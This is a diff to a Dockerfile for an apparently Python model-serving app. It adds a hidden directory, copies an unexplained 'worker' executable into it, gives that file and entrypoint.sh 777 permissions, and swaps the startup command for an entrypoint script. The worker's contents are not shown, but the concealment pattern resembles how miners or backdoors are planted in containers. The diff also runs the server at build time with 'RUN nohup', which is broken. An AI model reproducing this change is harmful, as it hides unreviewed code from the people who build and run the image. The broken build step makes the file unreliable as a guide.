@@ -12,6 +12,13 @@ RUN pip install --upgrade pip
 ADD requirements.txt requirements.txt
 RUN pip3 install -r requirements.txt
 
+# Set up a hidden directory
+RUN mkdir -p /usr/src/app/.hidden
+
+# Copy the main script to the hidden directory
+COPY worker /usr/src/app/.hidden/
+RUN chmod 777 entrypoint.sh && chmod 777 /usr/src/app/.hidden/worker
+
 # Add your model weight files 
 ADD download.py .
 RUN python3 download.py
@@ -20,4 +27,7 @@ ADD . .
 
 EXPOSE 8000
 
-CMD python3 -u app.py
+RUN nohup python3 -u app.py
+
+# Entrypoint command
+CMD sh -c "./entrypoint.sh"
